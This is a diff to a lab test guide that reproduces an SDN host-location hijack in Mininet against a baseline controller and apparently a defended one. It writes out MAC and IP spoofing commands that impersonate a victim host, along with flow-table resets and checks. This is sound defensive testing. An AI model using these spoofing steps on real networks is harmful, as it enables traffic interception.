@@ -23,6 +23,18 @@ Topology used:
 
 ## 1) Manual Test on Insecure Baseline
 
+## Why there are so many commands
+
+This test is written to be *deterministic* and match what `hlh_auto.py` does, not to be minimal.
+
+In particular, the flow-table cleanup/reset is done multiple times because each phase is trying to measure a different thing:
+
+- **Before the pre-check**: remove any residual dataplane rules so the controller re-learns in a known state.
+- **Right after the spoof**: force a fresh (re)learn under the attacker’s forged identity (this is the actual “attack trigger”).
+- **Before the post-check**: ensure the flows you dump/observe were installed *after* the spoof and aren’t leftovers.
+
+If you only care about “does it hijack?” and don’t need strict reproducibility, you can skip some resets (see **Quick variant** below).
+
 ### Terminal A (controller)
 
 ```bash
@@ -38,48 +50,25 @@ sudo python3 topology.py
 Inside Mininet CLI, run:
 
 ```bash
-# Warm up host learning and pin victim mapping at traffic source
+
+# Pre-attack check
 h2 ping -c 2 10.0.0.3
 h3 arp -s 10.0.0.2 00:00:00:00:00:02
 h3 ping -c 2 10.0.0.2
-
-# Clear dataplane flows for deterministic pre-check
-sh ovs-ofctl -O OpenFlow13 del-flows s1
-sh ovs-ofctl -O OpenFlow13 del-flows s2
-sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
-sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
-
-# Pre-attack check
-h3 ping -c 2 10.0.0.2
-h3 ping -c 1 10.0.0.2
 sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"
 
-# Host-location hijack: h1 spoofs h2 MAC
+# Host-location hijack: h1 spoofs h2 MAC and claim victim IP
 h1 ip link set dev h1-eth0 down
 h1 ip link set dev h1-eth0 address 00:00:00:00:00:02
 h1 ip link set dev h1-eth0 up
-# Real attacker behavior: also claim victim IP so h1 can answer as 10.0.0.2
 h1 ip addr add 10.0.0.2/24 dev h1-eth0
 
-# Deterministic relearn trigger (matches hlh_auto.py)
-sh ovs-ofctl -O OpenFlow13 del-flows s1
-sh ovs-ofctl -O OpenFlow13 del-flows s2
-sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
-sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
-h1 ip neigh flush all
-h1 ping -c 5 -i 0.05 -W 1 10.0.0.254
-h1 arp -s 10.0.0.3 00:00:00:00:00:03
-h1 ping -c 8 -i 0.05 -W 1 10.0.0.3
-
 # Recompute and post-attack checks
-sh ovs-ofctl -O OpenFlow13 del-flows s1
-sh ovs-ofctl -O OpenFlow13 del-flows s2
-sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
-sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
+sh ovs-ofctl -O OpenFlow13 del-flows s1; ovs-ofctl -O OpenFlow13 del-flows s2; ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"; ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
+h1 ping -c 8 -i 0.05 -W 1 10.0.0.3
 h3 ping -c 3 10.0.0.2
-h3 ping -c 1 10.0.0.2
 sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"
-```
+
 
 ### Expected Output (Baseline)
 
@@ -113,43 +102,22 @@ sudo python3 topology.py
 Inside Mininet CLI, run the same sequence:
 
 ```bash
-# Warm up host learning and pin victim mapping
+# Pre-attack check
 h2 ping -c 2 10.0.0.3
 h3 arp -s 10.0.0.2 00:00:00:00:00:02
 h3 ping -c 2 10.0.0.2
-
-# Clear dataplane flows for deterministic pre-check
-sh ovs-ofctl -O OpenFlow13 del-flows s1
-sh ovs-ofctl -O OpenFlow13 del-flows s2
-sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
-sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
-
-# Pre-attack check
-h3 ping -c 2 10.0.0.2
-h3 ping -c 1 10.0.0.2
 sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"
 
-# Same host-location hijack attempt
+# Host-location hijack: h1 spoofs h2 MAC and claim victim IP
 h1 ip link set dev h1-eth0 down
 h1 ip link set dev h1-eth0 address 00:00:00:00:00:02
 h1 ip link set dev h1-eth0 up
 h1 ip addr add 10.0.0.2/24 dev h1-eth0
-sh ovs-ofctl -O OpenFlow13 del-flows s1
-sh ovs-ofctl -O OpenFlow13 del-flows s2
-sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
-sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
-h1 ip neigh flush all
-h1 ping -c 5 -i 0.05 -W 1 10.0.0.254
-h1 arp -s 10.0.0.3 00:00:00:00:00:03
-h1 ping -c 8 -i 0.05 -W 1 10.0.0.3
 
 # Recompute and post-attack checks
-sh ovs-ofctl -O OpenFlow13 del-flows s1
-sh ovs-ofctl -O OpenFlow13 del-flows s2
-sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
-sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
+sh ovs-ofctl -O OpenFlow13 del-flows s1; ovs-ofctl -O OpenFlow13 del-flows s2; ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"; ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
+h1 ping -c 8 -i 0.05 -W 1 10.0.0.3
 h3 ping -c 3 10.0.0.2
-h3 ping -c 1 10.0.0.2
 sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"
 ```
 
